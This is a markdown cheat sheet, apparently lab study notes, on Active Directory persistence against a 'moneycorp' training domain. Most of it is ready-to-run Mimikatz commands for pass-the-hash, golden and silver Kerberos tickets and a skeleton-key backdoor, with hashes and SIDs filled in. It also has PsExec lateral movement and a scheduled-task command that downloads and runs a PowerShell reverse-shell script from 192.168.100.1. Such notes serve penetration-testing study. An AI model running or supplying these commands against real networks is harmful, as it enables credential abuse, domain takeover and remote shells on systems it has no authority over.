# Persistence
> test

## Over Pass The Hash
PTH with mimikatz --> perform activities as the hash but Windows still think I am the same person
```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"'
```

## Golden ticket
Create Golden Ticket -> need krbtgt hash
```powershell
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```
## Silver Ticket
Use hash of service account - In this case dcorp-dc$
```powershell
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:6f5b5acaf7433b3282ac22e21e62ff22 /user:Administrator /ptt"'
```


## Avaiable services
>image form [Hacktrick](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket)

![Avaiable services](./images/services.png)

CIFS service (CIFS)
```powershell
ls \\dcorp-dc.dollarcorp.moneycorp.local\c$
```
wmi service (HOST + RPCSS)
```powershell
.\PsExec.exe \\dcorp-dc.dollarcorp.moneycorp.local ipconfig
```
Scheduled Tasks (HOST)
```powershell
# Check Access
schtasks /S dcorp-dc.dollarcorp.moneycorp.local
# Create
schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.100.1:8080/Invoke-PowerShellTcp.ps1''')'"
# Run
schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "STCheck"
```
to do
- add other services


## Skeleton key
Inject skeleton key
```powershell
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'
```
Access any computer as any user on the domain using password **mimikatz**
```powershell
Enter-PSSession -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Credential dcorp\administrator
```
